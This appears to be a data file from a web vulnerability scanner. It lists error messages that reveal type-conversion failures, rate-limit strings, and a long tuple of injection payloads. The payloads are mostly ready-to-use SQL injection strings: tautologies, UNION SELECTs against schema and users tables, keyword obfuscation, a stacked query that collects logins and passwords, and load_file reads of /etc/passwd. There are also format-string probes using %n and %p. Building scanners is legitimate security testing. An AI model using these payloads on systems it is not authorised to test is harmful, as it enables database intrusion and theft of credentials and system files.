# sql payloads for heuristic checks

HEURISTIC_CHECK_ALPHABET	= 	('"', '\'', ')', '(', ',', '.')

FORMAT_EXCEPTION_STRINGS = ("Type mismatch", "Error converting", "Conversion failed", "String or binary data would be truncated", "Failed to convert", "unable to interpret text value", "Input string was not in a correct format", "System.FormatException", "java.lang.NumberFormatException", "ValueError: invalid literal", "DataTypeMismatchException", "CF_SQL_INTEGER", " for CFSQLTYPE ", "cfqueryparam cfsqltype", "InvalidParamTypeException", "Invalid parameter type", "is not of type numeric", "<cfif Not IsNumeric(", "invalid input syntax for integer", "invalid input syntax for type", "invalid number", "character to number conversion error", "unable to interpret text value", "String was not recognized as a valid", "Convert.ToInt", "cannot be converted to a ", "InvalidDataException", "strconv.IntFloat","strconv.ParseFloat", "SyntaxError:")

RATE_LIMIT_STRINGS = ("rate limited", "too many requests", "blocked")

PAYLOADS = ("%s%p%x%d",
".1024d",
"%.2049d",
"%p%p%p%p",
"%x%x%x%x",
"%d%d%d%d",
"%s%s%s%s",
"%99999999999s",
"%08x",
"%%20d",
"%%20n",
"%%20x",
"%%20s",
"%s%s%s%s%s%s%s%s%s%s",
"%p%p%p%p%p%p%p%p%p%p",
"%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%",
"%s x 129",
"%x x 257",
"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
"||6",
"'||'6",
"(||6)",
"' OR 1=1-- ",
"OR 1=1",
"' OR '1'='1",
"; OR '1'='1'",
"%22+or+isnull%281%2F0%29+%2F*",
"%27+OR+%277659%27%3D%277659",
"%22+or+isnull%281%2F0%29+%2F*",
"%27+--+",
"' or 1=1--",
"\" or 1=1--",
"' or 1=1 /*",
"or 1=1--",
"' or 'a'='a",
"\" or \"a\"=\"a",
"') or ('a'='a",
"Admin' OR '",
"'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--",
") UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;",
"' having 1=1--",
"' having 1=1--",
"' group by userid having 1=1--",
"' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--",
"' or 1 in (select @@version)--",
"' union all select @@version--",
"' OR 'unusual' = 'unusual'",
"' OR 'something' = 'some'+'thing'",
"' OR 'something' like 'some%'",
"' OR 'text' = N'text'",
"' OR 2 > 1",
"' OR 'whatever' in ('whatever')",
"' OR 'text' > 't'",
"' OR 2 BETWEEN 1 and 3",
"' or username like char(37);",
"' union select * from users where login = char(114,111,111,116);",
"' union select ",
"Password:*/=1--",
"UNI/**/ON SEL/**/ECT",
"'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'",
"'; EXEC ('SEL' + 'ECT US' + 'ER')",
"'/**/OR/**/1/**/=/**/1",
"' or 1/*",
"+or+isnull%281%2F0%29+%2F*",
"%27+OR+%277659%27%3D%277659",
"%22+or+isnull%281%2F0%29+%2F*",
"%27+--+&password=",
"'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > ",
" @var select @var as var into temp end --",
"' and 1 in (select var from temp)--",
"' union select 1,load_file('/etc/passwd'),1,1,1;",
"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",
"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));"
)